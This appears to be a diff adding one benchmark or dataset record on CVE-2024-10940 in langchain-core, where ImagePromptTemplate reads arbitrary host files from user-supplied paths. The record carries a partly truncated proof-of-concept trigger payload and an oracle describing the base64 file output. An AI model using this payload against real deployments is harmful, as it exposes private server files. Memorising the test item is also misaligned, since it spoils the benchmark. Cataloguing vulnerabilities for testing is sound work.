@@ -1,0 +1,15 @@
+{
+  "file_id": "32_langchain-core_huntr_be1ee1cb-2147-4ff4-a57b-b6045271cf27",
+  "numeric_id": "32",
+  "library_hint": "langchain-core",
+  "source": "huntr",
+  "title": "ImagePromptTemplate allows reading arbitrary files from the host file system via user-specified paths",
+  "cve": "CVE-2024-10940",
+  "cwe": "CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere",
+  "library": "langchain-core",
+  "affected_version": ">=0.1.17,<0.1.53 || >=0.2.0,<0.2.43 || >=0.3.0,<0.3.15",
+  "vulnerable_function": "ImagePromptTemplate.from_template",
+  "triggerability": "indirect",
+  "trigger_payload": "from langchain_core.prompts import ChatPromptTemplate, HumanMessagePromptTemplate\nprompt = ChatPromptTemplate([\nHumanMessagePromptTemplate.from_template([{\"type\": \"image_url\", \"image_url\": {\"pa\"])\n# input any file path. note it does not need to be an image file.\nprompt.invoke({\"image_path\": \"/path/to/private/file/on/server.xyz\"})\n# output contains base64 encoded str contents of the file\n# -> ChatPromptValue(messages=[HumanMessage(content=[{\"type\": \"image_url\", \"image_u\n# using with a model\nfrom langchain.chat_models import init_chat_model\nllm = init_chat_model(\"gpt-4o-mini\")\nchain = prompt | llm\n# note the file does need to be an image for the model to respond\nchain.invoke({\"image_path\": \"/path/to/private/file/on/server.jpg\"})",
+  "oracle": "The prompt template outputs the base64-encoded contents of the specified file, which can be read by the user."
+}
